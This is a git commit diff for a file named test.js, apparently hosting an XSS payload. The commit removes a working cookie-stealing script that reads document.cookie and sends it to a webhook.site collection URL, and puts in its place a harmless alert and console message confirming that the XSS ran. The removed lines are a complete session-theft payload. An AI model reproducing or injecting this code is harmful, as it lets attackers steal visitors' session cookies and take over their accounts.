ab3e799c92830b815c1c4ae4e7f6efc311b43144
chtipilou <90285314+chtipilou@users.noreply.github.com>
2025-03-09 17:56:30 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,20 +1,2 @@
-(function() {
-    // Récupère tous les cookies
-    const cookies = document.cookie;
-    
-    // Crée l'URL avec les cookies en paramètre
-    const url = 'https://webhook.site/33fc25fd-1bf0-4672-8f43-c6c083183e9f?cookies=' + encodeURIComponent(cookies);
-    
-    // Envoie les cookies via une requête fetch
-    fetch(url, {
-        method: 'GET',
-        mode: 'no-cors'
-    })
-    .then(() => {
-        console.log('Script exécuté avec succès - Cookies envoyés');
-        alert('Le script a été correctement mis en place et exécuté !');
-    })
-    .catch(error => {
-        console.error('Erreur:', error);
-    });
-})();
+alert("XSS réussi !");
+console.log("Si tu vois ce message dans la console, c'est que le script a bien été exécuté !");
